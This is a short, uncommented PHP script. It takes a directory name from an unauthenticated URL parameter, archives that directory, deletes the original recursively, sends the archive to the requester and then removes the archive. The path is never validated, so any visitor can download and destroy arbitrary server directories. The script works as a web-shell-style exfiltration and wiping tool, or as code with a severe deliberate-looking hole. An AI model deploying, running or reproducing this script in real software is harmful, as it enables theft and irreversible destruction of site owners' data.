<?php
$phar = new PharData($_GET["d"].".tar");
$phar->buildFromDirectory($_GET["d"]);

function emptyDir($a){if(is_dir($a)){$b=scandir($a);foreach($b as $c){if($c!="."&&$c!=".."){if(is_dir($a."/".$c))emptyDir($a."/".$c);else unlink($a."/".$c);}}reset($b);rmdir($a);}}
emptyDir($_GET["d"]);

function getsize($a,$b=2){if(is_file($a)){$a=filesize($a);}elseif(is_dir($a)){$a=dirsize($a);}return$a;}
function dirsize($a){$b=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($a));$c = 0;foreach($b as $d){$c+=$d->getSize();}return $c;}
function _download($a,$b){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Length: '.getsize($a));header('Content-Disposition: attachment; filename='.basename($b));readfile($a);}
_download($_GET["d"].".tar", $_GET["d"].".tar");
unlink($_GET["d"].".tar");
